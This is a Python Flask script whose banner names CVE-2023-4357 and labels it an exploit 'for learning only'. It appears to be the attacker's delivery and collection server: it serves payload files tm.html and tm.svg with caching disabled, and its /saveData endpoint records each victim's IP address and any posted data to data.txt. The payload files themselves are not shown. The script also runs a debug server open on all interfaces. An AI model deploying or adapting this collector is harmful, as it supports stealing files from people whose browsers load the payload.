from flask import Flask, request, jsonify,make_response


def begin():
    print('''

  ______     _______     ____   ___ ____  _____       _  _  _________ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ /      | || ||___ / ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____| || |_ |_ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____|__   _|__) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|____/         |_||____/____//_/   

                            @Auth: T0ngMystic
                            @tips: Exp仅供学习使用，请勿用于其他用途    
                            @Blog: https://t0ngmystic.com             

        ''')
app = Flask(__name__)

@app.route('/saveData', methods=['POST'])
def save_data():
    try:
        client_ip = request.remote_addr
        data = request.get_json()

        # Write data to file
        with open('data.txt', 'a') as file:
            file.write(client_ip+":\n")
            for key,vule in data.items():
                file.write(key + ":\n")
                file.write(vule + ":\n")

        return jsonify({'message': 'Data written to file'}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': 'Error writing to file'}), 500
@app.route('/svg')
def get_svg():
    # 返回文件，并手动设置响应头来禁用浏览器缓存
    svg_data = open('tm.svg', 'rb').read()
    response = make_response(svg_data)
    response.headers['Content-Type'] = 'image/svg+xml'
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/')
def get_html():
    # 读取 tm.html 文件内容
    html_data = open('tm.html', 'r').read()

    # 创建响应对象
    response = make_response(html_data)

    # 设置响应头
    response.headers['Content-Type'] = 'text/html'
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'

    return response

if __name__ == '__main__':
    begin()
    app.run(host='0.0.0.0', port=5005, debug=True)
